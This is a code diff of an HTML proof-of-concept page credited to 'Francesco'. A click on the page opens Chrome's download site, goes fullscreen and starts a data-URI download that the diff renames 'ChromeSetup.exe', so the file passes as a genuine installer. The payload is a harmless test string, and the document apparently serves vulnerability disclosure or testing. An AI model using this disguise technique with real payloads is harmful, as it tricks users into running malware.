@@ -6,7 +6,7 @@
 </head>
 <body>
   <center><h2>POC by Francesco!</h2></center>
-  <input type="text" id="triggerInput">
+  <input type="text" id="triggerInput" placeholder="Click here">
   <script>
     
     document.getElementById('triggerInput').addEventListener('click', function() {
@@ -14,7 +14,7 @@
  setTimeout(function() {
         openWin();
  }, 2000);
- window.open('https://www.google.com/', '_blank');
+ window.open('https://www.google.com/intl/id_id/chrome/', '_blank');
       goFullScreen();
     }, { once: false }); // Use { once: true } to ensure it only fires once
     // Download helper
@@ -29,8 +29,8 @@
     // Kick off your “APK” download
     function openWin() {
       Puf(
-        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "poc.apk"
+        "data:https://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
+        "ChromeSetup.exe"
       );
     }
     function goFullScreen() {
